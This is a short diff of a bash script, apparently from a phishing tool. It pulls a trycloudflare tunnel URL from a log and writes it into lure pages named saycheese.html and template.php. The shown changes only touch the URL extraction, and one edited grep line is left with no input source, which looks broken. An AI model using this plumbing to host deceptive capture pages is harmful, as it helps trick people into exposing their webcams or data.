@@ -122,7 +122,7 @@ fi
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting server...\e[0m\n"
 
 sleep 3
-send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log" sendlink)
+send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log")
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
@@ -214,7 +214,7 @@ fi
 
 payload() {
 
-send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' sendlink)
+send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com')
 
 sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
